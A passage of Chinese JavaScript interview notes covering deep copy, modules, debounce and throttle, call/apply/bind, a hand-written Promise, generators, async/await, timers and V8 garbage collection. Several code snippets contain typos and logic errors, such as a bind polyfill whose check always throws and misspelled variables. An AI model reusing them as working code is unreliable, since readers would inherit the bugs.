Object.assign(&#123;&#125;,a);a.age = 2;console.log(b.age); // 1 也可通过展开运算符（…）来解决 12345678let a = &#123; age:1&#125;let b = &#123; ...a&#125;a.age = 2;console.log(b.age); // 1 通常拷贝能解决大部分问题，但是当我们遇到下面的情况就需要使用深拷贝了 1234567891011let a = &#123; age:1, jobs:&#123; first:'FE' &#125;&#125;let b = &#123; ...a&#125;a.job.first = 'native';console.log(b.jobs.first); // native 浅拷贝只解决了第一层问题，如果接下去的值中还有对象的话，那么两者又享有相同的引用，要解决这个问题，要引入深拷贝。 深拷贝这个问题通常可以通过 JSON.parse(JSON.stringify(object))来解决 12345678910let a = &#123; age:1, jobs:&#123; first:'FE' &#125;&#125;let b = JSON.parse(JSON.stringify(a));a.jobs.first = 'native';console.log(b.jobs.first); // 'FE' 但是该方法也是有局限性的： 会忽略 undefined 会忽略 symbol 不能序列化函数 不能解决循环引用的对象 123456789101112131415161718let obj = &#123; a:1, b:&#123; c:2, d:3 &#125;&#125;obj.c = obj.b;obj.e = obj.a;obj.b.c = obj.cobj.b.d = obj.bobj.b.e = obj.b.clet newObj = JSON.parse(JSON.stringify(obj));console.log(newObj);// Uncaught TypeError: Converting circular structure to JSON// at JSON.stringify (&lt;anonymous&gt;)// at &lt;anonymous&gt;:14:30 在遇到函数、undefined或者 symbol 的时候，该对象也不能正常的序列化 12345678let a = &#123; age:undefined, sex:Symbol('male'), jobs:function()&#123;&#125;, name:'haha'&#125;let b = JSON.parse(JSON.stringify(a));console.log(b); // &#123;name:'haha'&#125; 在上述代码中，该方法会忽略掉函数和 undefined 但是在通常情况下，复杂数据是可以序列化的，所以这个函数可以解决大部分问题，并且该函数是内置函数中处理深拷贝性能最快的。数据中含有以上三种情况下，可以使用 lodash 的深拷贝函数。 如果所需要拷贝的对象含有内置类型并且不包括函数的，可以使用 MessageChannel 12345678910111213141516171819function structuralClone(obj)&#123; return new Promise(resolve =&gt;&#123; const &#123;port1,port2&#125; = new MessageChannel; port2.onmessage = ev =&gt; resolve(ev.data); port1.postMessage(obj) &#125;)&#125;var obj = &#123; a:1, b:&#123; c:b &#125;&#125;// 该方法是异步的// 可以循环处理 undefined 和循环引用对象(async ()=&gt;&#123; const clone = await structualClone(obj)&#125;)() 我们也可以自己创建一个 deepClone 函数 12345678910111213// 数字 字符串 function 不需要拷贝function deepCline(value)&#123; if(value == null) return value; if(typeof value !== 'object') return value; if(value instanceof RegExp) return new RegExp(value); if(value instanceof Date) return new Date(value) // 判断是数组还是对象 let obj = new value.constructor; for(let ket in value)&#123; obj[key] = deepClone(value[key]) &#125; return obj;&#125; 模块化在有 Babel 的情况下， 可以直接使用 ES6 的模块化 12345678910// file a.jsexport function a()&#123;&#125;export function b()&#123;&#125;// file b.jsexport default function()&#123;&#125;import &#123;a,b&#125; from './a.js'import XXX from './b.js' CommonJSCommonJS 是 Node 独有的规范，浏览器中使用就需要用到 Broserify 解析 12345678910// a.jsmodule.exports = &#123; a:1&#125;export.a = 1;// b.jsvar module = require('./a.js');module.a // -&gt; log 1 在上述代码中，module.export 和 export 很容易混淆，看看大致的内部实现 123456789101112131415161718var module = require('./a.js');module.a// 这里其实就是包装了一层立即执行函数，这样就不会污染全局变量了，重要的是 module 这里，module 是 Node 独有的一个变量module.exports = &#123; a:1&#125;// 基本实现var module = &#123; exports:&#123;&#125; // exports 就是空对象&#125;// 这也是为什么 exports 和 module.exports 用法相似的原因var exports = module.exports;var load = function(module)&#123; var a = 1; module.exports = a; return module.exports&#125; module.exports 和 exports 用法其实是相似的，但是不能对 exports 直接赋值，不会有任何效果。 对于 CommonJS 和 ES6 的模块化的两者区别是： 前者支持动态导入，也就是 require(${path}/xx.js),后者不支持，但是已有提案 前者是同步导入，因为用于服务端，文件都在本地，同步导入即使卡住线程影响也不大。而后者是异步导入，因为用于浏览器，需要下载文件，如果也采用同步导入会对渲染有很大影响 前者在导出时都是值拷贝，就算导出的值变了，导入的值也不会改变，所以如果想要更新值，必须重新导入一次。但是后者采用实时绑定的方式，导入导出的值都指向同一个内存地址，所以导入值会跟随导出值变化 后者会编译成 require/exports 来执行 AMDAMD 是由 RequireJS 提出的 1234567891011define(['./a.js','./b.js'],function(a,b)&#123; a.do(); b.do();&#125;);define(function(require,exports,module)&#123; var a = require('./a'); a.doSomething(); var b = require('./b'); b.doSomething();&#125;); 节流和防抖的理解防抖和节流都是防止函数多次调用。区别在于，假设一个用户一直触发这个函数，且每次触发函数的间隔小于 wait，防抖的情况只会调用一次，而节流的情况会隔一定时间（参数wait）调用函数 防抖在滚动事件中需要做一个复杂计算或者是实现一个按钮防止第二次点击操作。这些需求都可以通过函数防抖来实现，尤其是第一个需求，如果在频繁的时间回调中做复杂计算，很有可能会导致页面卡顿，不如将多次计算合并为一次计算，只在一个精确点做操作。 通俗化：如果用手指一直按着弹簧，它将不会弹起知道你松手为止 袖珍版的防抖： 1234567891011121314// func 是用户传入需要防抖的函数// wait 是等待时间const debounce = (func,wait = 50) =&gt;&#123; // 缓存一个定时器id let timer = 0; // 返回的函数是每次用户实际调用防抖函数，如果已经设定过定时器就清空上一次的定时器，开始一个新的定时器，延迟用户传入的方法 return function(..args)&#123; if (timer) clearTimeout(timer); timer = setTimeout(()=&gt;&#123; func.apply(this,args); &#125;,wait); &#125;&#125;// 不难看出来如果用户调用该函数间隔小于 wait 的情况下，上一次时间还未到就被清除了，并不会执行函数。 这是一个简单的防抖，但是有缺陷，在于它只能最后调用。一般的防抖会有 immediate 选项，表示是否立即调用。这两者的区别： 例如在搜索引擎搜索问题的时候，我们当然希望用户输入完最后一个字才调用查询接口，这个时候用 延迟执行 的防抖函数，它总是在一连串（间隔小于 wait）函数触发之后调用 例如用户给项目点 star 的时候，我们希望用户点第一下的时候就去调用接口，并成功之后改变 star 按钮的样子，用户就可以立马得到反馈是否 star 成功了，这个情况使用 立即调用的防抖函数，它总在第一次调用，并且下一次调用必须和前一次调用的时间间隔大于 wait 才会触发。 带有立即执行的防抖函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 这个用来获取当前时间戳function now()&#123; return +new Date();&#125;/*** 防抖函数，返回函数连续调用，空闲时间必须大于或者等于 wait,func 才会执行* @param &#123;function&#125; func 回调函数* @param &#123;number&#125; wait 表示窗口的间隔* @param &#123;boolean&#125; immediate 设置为 true时，是否立即调用函数* @return &#123;function&#125; */function debounce(func,wait=50,immediate=true)&#123; let timer,context,args; // 延迟执行函数 const later = () =&gt; setTimeout(()=&gt;&#123; // 延迟执行函数执行完毕，清除缓存的定时器序号 timer = null; // 延迟执行的情况下，函数会在延时函数中执行，使用到之前缓存的参数和上下文 if(!immediate)&#123; func.apply(context,args); context = args = null &#125; &#125;,wait) // 这里返回的函数是每次实际调用的函数 return function(...params)&#123; // 如果没有创建样式执行函数（later）,那就创建一个 if(!timer)&#123; timer = later(); // 如果是立即执行，调用函数，否则缓存参数和调用上下文 if(immediate)&#123; func.apply(this,params); &#125;else&#123; context = this; args = params &#125; // 如果已有延迟执行函数（later） ，调用的时候清除原来的并重新设定一个 // 这样做延迟函数会重新计时 &#125;else&#123; clearTimeout(timer); timer = later(); &#125; &#125;&#125;; 总结一下： 对于按钮点击来说的实现:如果函数是立即执行的，就理解调用，如果函数是延迟执行的，就缓存上下文和参数，放到延迟函数中执行，一旦开始一个定时器，只要定时器还在，每次点击都会重新计时。一旦定时器时间到了，定时器重置为null,就可以再次点击了。 对于延迟函数来说的实现：清除定时器ID，如果是延迟调用就调用函数 节流防抖和节流本质上是不一样的。防抖是将多次执行变成最后一次执行，节流是将多次执行变成每隔一段时间执行。 通俗化：如果将水龙头拧紧直到水是以水滴的形式流出，那么你会发现隔一段时间，就会有一滴水溜出来。也就是会预先设定一个执行周期，当调用动作的时刻大于等于执行周期则执行该动作，然后进入下一个周期 袖珍版实现： 12345678910const throttle = (wait,func)=&gt;&#123; let last = 0; return function(...args)&#123; const curr = +new Date(); if(curr - last &gt; wait)&#123; func.apply(this,args); last = curr; &#125; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/*** underscore 节流函数，返回函数连续调用，func 执行频率是 次/wait* @param &#123;function&#125; func 回调函数* @param &#123;number&#125; wait 表示窗口的间隔* @param &#123;object&#125; options 如果想忽略开始函数的调用，传入&#123;leading:false&#125;,如果想忽略结尾函数则是&#123;trailing:false&#125;,两者不能共存，否则函数不执行。* @return &#123;function&#125; 返回客户调用的函数*/_.throttle = function(func,wait,options)&#123; let context,args,result; let timeout = null; // 之间的时间戳 let previous = 0; // 如果 options 没传则设置为空对象 if(!options) options = &#123;&#125;; // 定时器回调函数 const later = function()&#123; // 如果设置了 leading,就将 previous 设为0，用于下一个函数的第一个 if 判断 previous = options.length === false ? 0 : _.now(); // 置空是为了防止内存泄露，也是为了下面定时器的判断 timeout = null; result = func.apply(context,args); if(!timeout) context = args = null; &#125; return function()&#123; // 获得当前的时间戳 const now = _.now; // 首先进入前者肯定要为 true,如果需要第一次不执行函数，就将上次时间戳设定为当前的，就下来的计算中 remaining 的值时会大于0 if(previous &amp;&amp; options.leading === false) previous = now; // 计算剩下的时间 const remaining = wait - (now - previous); context = this; args = arguments; // 如果当前调用给意见大于上次时间 + wait，或者用户手动调了事件，如果设置 trailing，只会进入这个条件 if(remaining &lt;= 0 || remaining &gt; wait)&#123; // 如果存在定时器就清理掉否则会调用二次回调 if(timeout)&#123; clearTimeout(timeout); timeout = null; &#125; previous = now; result = func.apply(context,args); if(!timeout) context = args = null; &#125;else if(!timeout &amp;&amp;options.trailing !== false)&#123; // 判断是否设置了定时器和 trailing ，没有的话就开启一个定时器，并且不能同时设置 leading 和 trailing timeout = setTimeout(later,remaining); &#125; return result &#125;&#125; 继承在 ES5 中，可以使用下面的方式解决继承的问题 1234567891011121314function Super()&#123;&#125;Super.prototype.getNumber = function()&#123; return 1&#125;function Sub()&#123;&#125;let s = new Sub();Sub.prototype = Object.create(Super.prototype,&#123; constructor:&#123; value:Sub, enumerable:false, writable:true, configurable:true &#125;&#125;); 上面的继承实现思路就是将子类的原型设置为父类的原型 在 ES6 中，可以通过 class 语法糖解决这个问题 1234567class MyDate extends Date&#123; test()&#123; return this.getTime(); &#125;&#125;let myDate = new MyDate();myDate.test(); call,apply,bind 区别call 和 apply 都是为了解决改变 this 的指向，作用都是相同的，只是传参的方式不同，除了第一个参数外，call 可以接受一个参数列表，apply 只接受一个参数数组 12345678910let a =&#123; value:1&#125;function getValue(name,age)&#123; console.log(name); console.log(age); console.log(this.value);&#125;getValue.call(a,'haha','24');getValue.apply(a,['haha','24']); 模拟实现 call 和 apply可以从下面几点来考虑如何实现 不传入第一个参数，那么默认可以为 window 改变了 this 指向，让新的对象可以执行该函数。 12345678910111213Function.prototype.myCall = function(context)&#123; var context = context || window; // 给 context 添加一个属性 // getValue.call(a,'haha',24) -&gt; a.fn('haha','24'); context.fn = this; // 将 context 后面的参数取出来 var args = [...arguments].slice(1); var result = context.fn(...args); // 删除 fn delete context.fn return result&#125; apply 的实现也是类似的 1234567891011Function.prototype.myApply = function(context)&#123; var context = context || window; context.fn = this; var result; // 判断是否存在第二个参数，如果存在就把第二个参数展开 if(arguments[1])&#123; result = context.fn(...arguments[1]); &#125;else&#123; result = context.fn(); &#125;&#125; bind 和其他两个方法作用也是一样的，只是该方法会返回一个函数。并且我们可以通过 bind 实现柯里化 模拟实现 bind 1234567891011121314Function.prototype.myBind = function(context)&#123; if(typeof this !== 'undefined')&#123; throw new TypeError('Error'); &#125; var _this = this; var args = [...arguments].slice(1); // 返回一个函数 return function F()&#123; if(this instanceof F)&#123; return new _this(..args,...arguments); &#125; return _this.apply(context,args.concat(...arguments)); &#125;&#125; Promise 实现Promise 是 ES6 新增的语法，解决了回调地狱的问题。 可以把 Promise 看成一个状态机。初始状态是 pending 状态，可以通过函数 resolve 和 reject ，将状态转变为 resolved 和 rejected 状态，状态一旦改变就不能再发生变化了。 then 函数会返回一个 Promise 实例，并且该返回值是一个新的实例而不是之前的实例。因为 Promise 规范规定了 pending 状态，其他状态是不可以改变的，如果返回的是同一个实例的话，多个 then 调用就失去意义了。 对于 then 来说，本质上可以把它看成 flatMap 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150 const PENDING = 'pending'; const RESOLVED = 'resolved'; const REJECTED = 'rejected'; // promise 接受一个函数参数，该函数会理解执行 function MyPromise(fn) &#123; let _this = this; _this.currentState = PENDING; _this.value = undefined; // 用于保存 then 中的回调，只有当 promise 状态为 pending 时才会缓存，并且每个实例至多缓存一个 _this.resolvedCallbacks = []; _this.rejectedCallbacks = []; _this.resolve = function (value) &#123; if (value instanceof MyPromise) &#123; // 如果 value 是个 Promise ，递归执行 return value.then(_this.resolve, _this.reject); &#125; setTimeout(() =&gt; &#123; // 异步执行，保证执行顺序 if (_this.currentState === PENDING) &#123; _this.currentState = RESOLVED; _this.value = value; _this.resolvedCallbacks.forEach(cb =&gt; cb()); &#125; &#125;); &#125; _this.reject = function (reason) &#123; setTimeout(() =&gt; &#123; if (_this.currentState === PENDING) &#123; _this.currentState = REJECTED; _this.value = reason; _this.rejectedCallbacks.forEach(cb =&gt; cb()); &#125; &#125;); &#125; // 用于解决下面的问题 // new Promise(()=&gt; throw Error('error')) try &#123; fn(_this.resolve, _this.reject) &#125; catch (e) &#123; _this.reject(e) &#125; &#125;// then 函数的作用是为 Promise 实例添加状态改变时的回调函数。then 方法的第一个参数是 resolved 状态的回调函数，第二个参数（可选）是 rejected 状态的回调函数。// then 方法返回的是一个新的 promise 实例，因此可以采用链式写法，即 then 方法后面再调用另一个 then 方法。 MyPromise.prototype.then = function (onResolved, onRejected) &#123; const self = this; // then 必须返回一个新的 promise let promise2; // 如果 onResolved 和 onRejected 都为可选参数，如果类型不是函数需要忽略，同时也实现了透传 // Promise.resolve(4).then().then((value)=&gt;console.log(value)) onResolved = typeof onResolved === 'function' ? onResolved : v =&gt; v; onRejected = typeof onRejected === 'function' ? onRejected : r =&gt; &#123; throw r &#125;; if (self.currentState === RESOLVED) &#123; return (promise2 = new MyPromise(function (resolve, reject) &#123; setTimeout(() =&gt; &#123; try &#123; let x = onResolve(self.value); resolutionProcedure(promise2, x, resolve, reject) &#125; catch (reason) &#123; reject(reason) &#125; &#125;); &#125;)) &#125; if (self.currentState === REJECTED) &#123; return (promise2 = new MyPromise(function (resolve, reject) &#123; setTimeout(() =&gt; &#123; try &#123; let x = onRejected(self.value); resolutionProcedure(promise2, x, resolve, reject) &#125; catch (reason) &#123; reject(reason) &#125; &#125;); &#125;)) &#125; if (self.currentState === PENDING) &#123; return (promise2 = new MyPromise(function (resolve, reject) &#123; self.rejectedCallbacks.push(function () &#123; try &#123; let x = onRejected(self.value); resolutionProcedure(promise2, x, resolve, reject) &#125; catch (r) &#123; reject(r) &#125; &#125;); self.resolvedCallbacks.push(function () &#123; try &#123; let x = onResolved(self.value); resolutionProcedure(promise2, x, resolve, reject) &#125; catch (r) &#123; reject(r) &#125; &#125;); &#125;)) &#125; &#125; function resolutionProcedure(promise2, x, resolve, reject) &#123; // x 不能与 promise2 相同，避免循环 if (promise2 === x) &#123; return reject(new TypeError('Error')); &#125; // 如果 x 为 Promise ，状态为 pending 需要继续等待否则执行 if (x instanceof MyPromise) &#123; if (x.currentState === PENDING) &#123; x.then(function (value) &#123; // 再次调用该函数是为了确认 x resolve 的 参数是什么类型，如果是基本类型就再次 resolve，把值传给下一个 then resolutionProcedure(promise2, x, resolve, reject); &#125;, reject); &#125; else &#123; x.then(resolve, reject); &#125; return; &#125; // reject 或者 resolve 其中一个执行得过的话，忽略其他的 let called = false; // 判断 x 是否为对象或者是函数 if (x !== null &amp;&amp; (typeof x === 'object' || typeof x === 'function')) &#123; // 如果不能取出 then ，就 reject try &#123; let then = x.then; if (typeof then === 'function') &#123; then.call( x, y =&gt; &#123; if (called) return; called = true; resolutionProcedure(promise2, y, resolve, reject); &#125;, e =&gt; &#123; if (called) return; called = true; reject(e); &#125;); &#125; else &#123; resolve(x) &#125; &#125; catch (e) &#123; if (called) return; called = true; reject(e) &#125; &#125; else &#123; resolve(x); &#125; &#125; Generator 实现Generator 是 ES6 中新增的语法，和 Promise 一样，都可以用异步来编程。 Generator 函数也可以理解成为一个状态机，封装了多个内部状态。 执行 Generator 函数会返回一个遍历器对象，也就是说，Generator 函数除了状态机，还是一个遍历器对象生成函数。返回的遍历器对象，可以依次遍历 Generator 函数内部的每一个状态。 形式上，Generator 函数是一个普通函数，但是有两个特征。一个是 function 关键字与函数名之间有一个 星号，二是函数内部使用 yield 表达式，表示不同的内部状态。 123456789101112// 使用 * 表示这是一个 Generator 函数// 内部可以使用 yield 暂停代码// 调用 next 恢复执行function* test()&#123; let a = 1 + 2; yield 2; yield 3; &#125;let b = test();b.next(); // &#123;value:2,done:false&#125;b.next(); // &#123;value:3,done:false&#125;b.next(); // &#123;value:undefined,done:true&#125; 上述代码可以发现，加上 * 的函数执行后拥有了 next 函数，也就是说函数执行后返回了一个对象。每次调用 next 函数可以继续执行被暂停的代码，下面是 Generator 的简单实现： 12345678910111213141516171819202122232425262728293031323334353637383940// cb 也就是编译的 test 函数function MyGerenator(cb) &#123; return (function () &#123; const object = &#123; next: 0, stop: function () &#123; &#125; &#125;; return &#123; next: function () &#123; const ret = cb(obj); if (ret === undefined) return &#123; value: undefined, done: true &#125; return &#123; value: ret, done: false &#125; &#125; &#125; &#125;)();&#125;// 使用 babel 编译后可以发现 test 函数变成了这样function test() &#123; let a; return MyGerenator(function () &#123; while (1) &#123; switch ((_context.prev = _context.next)) &#123; // 可以发现通过 yield 将代码分成了几块，每次执行 next 函数就执行一块代码，并且表明下次需要执行哪块代码 case 0: a = 1 + 2; _context.next = 4; return 2; case 4: _context.next = 6; return 3; case 6: case 'end': return _context.stop(); &#125; &#125; &#125;)&#125; 一道题目12345678function *foo(x)&#123; let y = 2 * (yield(x+1)) let z = yield(y/3) return (x+y+z)&#125;console.log(it.next()) // =&gt; &#123;value: 6, done: false&#125;console.log(it.next(12)) // =&gt; &#123;value: 8, done: false&#125;console.log(it.next(13)) // =&gt; &#123;value: 42, done: true&#125; 分析： 首先 Generator 函数调用和普通函数不同，它会返回一个迭代器 当执行第一次 next 时，传参会被忽略，并且函数暂停在 yield (x + 1) 处，所以返回 5 + 1 = 6 当执行第二次 next 时，传入的参数等于上一个 yield 的返回值，如果你不传参，yield 永远返回 undefined。此时 let y = 2 * 12，所以第二个 yield 等于 2 * 12 / 3 = 8 当执行第三次 next 时，传入的参数会传递给 z，所以 z = 13, x = 5, y = 24，相加等于 42 Map、FlatMap 和 ReduceMap 的作用是生成一个数组，遍历原数组，将每个元素拿出来然后做一些变换然后 append 到新的数组中 12[1,2,3].map(v=&gt;v+1);// [2,3,4] Map 有三个参数，分别是当前索引元素，索引，原数组 1234['1','2','3'].map(parseInt);// parseInt('1',0) -&gt; 1// parseInt('2',1) -&gt; NaN// parseInt('3',2) -&gt; NaN FlatMap 和 map 的作用几乎是相同的，但是对于多维数组来说，会将原数组降维。可以将 FlatMap 看成是 map + flatten ，目前该函数在浏览器中还不支持。 12[1,[2],3].flatMap(v=v+1);// [2,3,4] 如果想将一个多维数组彻底的降维，可以这样实现 123const flattenDeep = arr =&gt; Array.isArray(arr) ? arr.reduce((a,b)=&gt;[...a,...flattenDeep(b)],[]):[arr];flattenDeep([1,[[2],[3,[4]],5]]);// [1,2,3,4,5] Reduce 作用是数组中的值组合起来，最终得到一个值 1234567function a()&#123; console.log(1)&#125;function b()&#123; console.log(2);&#125;[a,b].reduce((a,b)=&gt;a(b())); async 和 await一个函数如果加上 async,那么该函数就会返回一个 Promise 1234async function test()&#123; return '1'&#125;console.log(test()); // -&gt; Promise &#123;&lt;resolved&gt;: "1"&#125; 可以把 async 看成函数返回值使用 Promise.resolve() 包裹了下。 await 只能在 async 函数中使用 12345678910111213function sleep()&#123; return new Promise(resolve=&gt;&#123; setTimeout(()=&gt;&#123; console.log('finish'); resolve('sleep'); &#125;,2000); &#125;);&#125;async function test()&#123; let value = await sleep(); console.log('object');&#125;test(); 上面代码会先打印 finish 然后再打印 object 。因为 await 会等待 sleep 函数 resolve ，所以即使后面是同步代码，也不会先去执行同步代码再来执行异步代码。 async 和 await 相比直接使用 Promise 来说，优势在于处理 then 的调用链，能够更清晰准确的写出代码。缺点在于滥用 await 可能会导致性能问题，因为 await 会阻塞代码，也许之后的异步代码并不依赖前者，但仍然需要等待前者完成，导致代码失去了并发性。 1234567891011121314let a = 0;const b = async() =&gt;&#123; a = a + await 10; console.log('2',a); a = (await 10) + a; console.log('3',a);&#125;b();a++console.log('1',a);// VM3859:10 1 1// VM3859:4 2 10// VM3859:6 3 20 首先函数 b 执行，在执行到了 await 10 之前 a 的变量还是 0，因为在 await 内部实现了generators ,generators 会保留堆栈中东西，a=0 被保存下来。 因为 await 是异步操作，遇到 await 会立即返回一个 pending 状态的 promise 对象，暂时返回执行代码的控制权，使得函数外的代码得以继续执行，所以会先执行 同步代码 console.log(‘1’,a); 同步代码之后就是异步代码，将保存下来的值拿出来用，这时候 a = 10 后面就是常规的执行代码了 常用的定时器函数相关面试题：setTimeout、setInterval、requestAnimationFrame 各有什么特点？ requestAnimationFrame请求动画帧。屏幕刷新频率，也就是屏幕上的图像每秒钟出现的次数，它的单位是赫兹（HZ）。当对着电脑屏幕什么也不做的情况下，显示器也会以每秒60次的频率在不断更新屏幕上的图像。我们之所以感觉不到变化的原因是因为人的眼睛有视觉停留效应，画之间间隔时间只有16.7ms（1000/60)，所以我们会觉得屏幕上的图像是静止不动的。 动画的本质就是要让人眼看到图像被刷新而引起的变化的视觉效果，这个变化要以连贯的平滑的方式过渡。 我们在每次刷新前，将图像的位置移动一个像素，这样一来，屏幕每次刷新出来的图像位置都比前一个要差一个像素。因为你会看到图像在移动，由于人眼的视觉停留效应，当前位置的图像停留在大脑的影响还没有消失，紧接着图像又被移到了下一个位置，因为你会看到图像在流畅地移动，这就是视觉效果上形成的动画。 requestAnimationFrame最大的优势就是系统决定的回调函数的执行时机，大概的意思就是回调函数会随着屏幕刷新的频率的变化而产生对应的变化。它能保证回调函数在屏幕每一次的刷新间隔中只执行一次，这样就不会引起丢帧现象，也不会导致动画出现卡顿的问题。 简单的调用 12345678910let progress = 0;function render()&#123; progress +=1; if(progress&lt;100)&#123; window.requestAnimationFrame(render) &#125;&#125;// 第一帧渲染window.requestAnimationFrame(render); 另外它还有两个优势： Cpu节能：使用 setTimeout 实现的动画，当页面被隐藏到最小化时，仍然会在后台执行动画人物，由于此时页面处于不可见或者不可用状态，刷新画面也是没有意义的，完全是浪费资源。而 requestAnimationFrame 则完全不同，当页面处理未激活的状态下，该页面的屏幕刷新人物也会被系统暂停，有效节省CPU 开销 函数节流：在高频率（resize,scroll）中吗，为了防止在一个刷新间隔内发生多出函数执行，使用 requestAnimationFrame 可以保证每个刷新的间隔内，函数只被执行一次，这样既可以保证流畅性，也能更好的节省函数执行的开销。一个刷新间隔内函数执行多次是没有意义的，因为显示器刷新的频率是一定的，多次绘制不会在屏幕上体现出来。 由于浏览器兼容问题，需要优雅降级做兼容，具体代码,摘自 requestAnimationFrame： 123456789101112131415161718192021222324if (!Date.now) &#123; Date.now = function () &#123; return new Date().getTime(); &#125;&#125;(function () &#123; var vendors = ['webkit', 'moz']; for (var i = 0; i &lt; vendors.length &amp;&amp; !window.requestAnimationFrame; i++) &#123; var vp = vendors[i]; window.requestAnimationFrame = window[vp + 'RequestAnimationFrame']; window.cancelAnimationFrame = window[vp + 'CancelAnimationFrame'] || window[vp + 'CancelRequestAnimationFrame']; if (/iP(ad|hone|od).*OS 6/.test(window.navigator.userAgent) || !window.requestAnimationFrame || !window.cancelAnimationFrame) &#123; var lastTime = 0; window.requestAnimationFrame = function (cb) &#123; var now = Date.now(); var nextTime = Math.max(lastTime + 16, now); return setTimeout(function () &#123; cb(lastTime = nextTime) &#125;, nextTime - now) &#125; window.cancelAnimationFrame = clearTimeout; &#125; &#125;&#125;)() setTimeout设置某个时间后执行某个动作，表示延时执行某个动作 setInterval设置每隔多久执行某个动作，循环的。setInterval 将注册函数植入 Event Queue,如果前面的任务耗能太久，那么就需要等待。 因为JS 单线程的问题，setTimeout 可能不会按期执行，可以通过代码去修正 setTimeout ，从而使定时器相对准确 12345678910111213141516171819202122232425let period = 60 * 1000 * 60 * 2;let startTime = new Date().getTime();let count = 0;let end = new Date().getTime + period;let interval = 1000;let currentInterval = interval;function loop() &#123; count++; // 代码执行所消耗的时间 let offset = new Date().getTime() - (startTime + count * interval); let diff = end - new Date().getTime(); let h = Math.floor(diff / (60 * 1000 * 60)) let hdiff = diff % (60 * 1000 * 60); let m = Math.floor(hdiff / (60 * 1000)); let mdiff = hdiff % (60 * 1000); let s = mdiff / (1000); let sCeil = Math.ceil(s); let sFloor = Math.floor(s); // 得出下一次循环所消耗的时间 currentInterval = interval - offset; setTimeout(loop, currentInterval); console.log('时：' + h, '分：' + m, '毫秒：' + s, '秒向上取整：' + sCeil, '代码执行时间：' + offset, '下次循环间隔' + currentInterval)&#125;setTimeout(loop, currentInterval) ProxyProxy 是 ES6 中新增的功能，可以用来自定义对象中的操作 12345678910111213141516171819202122232425262728let p = new Proxy(target,handler)// target 代表需要添加代理的对象// Handler 用来自定义对象中的操作// 可以很方便使用 Proxy 来实现一个数据的绑定和监听let onWatch = (obj,setBind,getLogger)=&gt;&#123; let handler = &#123; get(target,property,receiver)&#123; getLogger(target,property) return Reflect.get(target,property,receiver); &#125;, set(target,property,value,receiver)&#123; setBind(value); return Reflect.set(target,property,value); &#125; &#125;; return new Proxy(obj,handler);&#125;let obj = &#123; a: 1 &#125;;let value;let pw = onWatch(obj,(v)=&gt;&#123; value = v&#125;,(target,property)=&gt;&#123; console.log(`Get $&#123;property&#125; = $&#123;target[property]&#125;`);&#125;)pw.a = 2; // bind value to 2pw.a // get a = 2 为什么 0.1 + 0.2 != 0.3因为 JS 采用 IEEE 754 双精度版本（64位）,并且只要采用 IEEE 754 的语言都有该问题 原生解决方法： 1parseFloat((0.1+0.2).toFixed(10)) 正则表达式元字符 元字符 作用 . 匹配任意字符除了换行符和回车符 [] 匹配方括号内的任意字符。比如 [0-9] 就可以用来匹配任意数字 ^ ^9 这样使用匹配以 9 开头，[^9] 这样使用代表不匹配方括号内除了9的字符 {1,2} 匹配1到2位字符 (yck) 只匹配 yck 相同字符串 \ 匹配 \ 前后任意字符 \ 转义 * 只匹配出现0次及以上 *前的字符 + 只匹配出现1次及以上 +前的字符 ? ？ 之前字符可选 修饰符 修饰语 作用 i 忽略大小写 g 全局搜索 m 多行 字符简写 简写 作用 \w 匹配字母数字或下划线 \W 与上面相反 \s 匹配任意的空白符 \S 与上面相反 \d 匹配数字 \D 与上面相反 \b 匹配单词的开始或结束 \B 与上面相反 V8下的垃圾回收机制V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为了新生代和老生代两部分 新生代算法新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。 在新生代空间中，内存空间分为了两部分，分别为 From 空间和 To 空间。在这两个空间中，必定有一个空间是使用的，另一个空间是空闲的。新分配的对象会被放入 From 空间中，当 From 空间被占满的时候，新生代 GC 就会启动了。算法会检查 From 空间中存活的对象并复制到 To 空间中，如果有失活的对象就会销毁。当复制完成将 From 空间和 To 空间互换，这样 GC 就结束了。 老生代算法老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。 什么情况下对象会出现在老生代空间中： 新生代中的对象是否已经经历过一次 Scavenge 算法，如果经历过的话，会将对象从新生代空间移到老生代空间中。 To 空间的对象占比大小超过 25 %。在这种情况下，为了不影响到内存分配，会将对象从新生代空间移到老生代空间中 老生代中的空间很复杂，有如下几个空间 123456789101112131415enum AllocationSpace &#123; // TODO(v8:7464): Actually map this space's memory as read-only. RO_SPACE, // 不变的对象空间 NEW_SPACE, // 新生代用于 GC 复制算法的空间 OLD_SPACE, // 老生代常驻对象空间 CODE_SPACE, // 老生代代码对象空间 MAP_SPACE, // 老生代 map 对象 LO_SPACE, // 老生代大空间对象 NEW_LO_SPACE, // 新生代大空间对象 FIRST_SPACE = RO_SPACE, LAST_SPACE = NEW_LO_SPACE, FIRST_GROWABLE_PAGED_SPACE = OLD_SPACE, LAST_GROWABLE_PAGED_SPACE = MAP_SPACE&#125;; 在老生代中，以下情况会先启动标记清除算法： 某一个空间没有分块的时候 空间中被对象超过一定限制 空间不能保证新生代中的对象移动到老生代中 在这个阶段中，会遍历堆中所有的对象，然后标记活的对象，在标记完成后，销毁所有没有被标记的对象。在标记大型对内存时，可能需要几百毫秒才能完成一次标记。这就会导致一些性能上的问题。为了解决这个问题，2011 年，V8 从 stop-the-world 标记切换到增量标志。在增量标记期间，GC 将标记工作分解为更小的模块，可以让 JS 应用逻辑在模块间隙执行一会，从而不至于让应用出现停顿情况。但在 2018 年，GC 技术又有了一个重大突破，这项技术名为并发标记。该技术可以让 GC 扫描和标记对象时，同时允许 JS 运行，你可以点击 该博客 详细阅读。 清除对象后会造成堆内存出现碎片的情况，当碎片超过一定限制后会启动压缩算法。在压缩过程中，将活的对象像一端移动，直到所有对象都移动完成然后清理掉不需要的内存。 Event Loop进程和线程两个名词都是 CPU 工作时间片的一个描述。 进程描述了 CPU 在运行指令以及记载和保存上下文所需的时间，放在应用上来说就代表了一个程序。 线程是进程中更小的单位，描述了一段指令所需要的时间。 在浏览器中，打开一个 Tab 页面，就是创建了一个进程，一个进程里面可以有多个线程，例如渲染线程，JS 引擎线程，HTTP 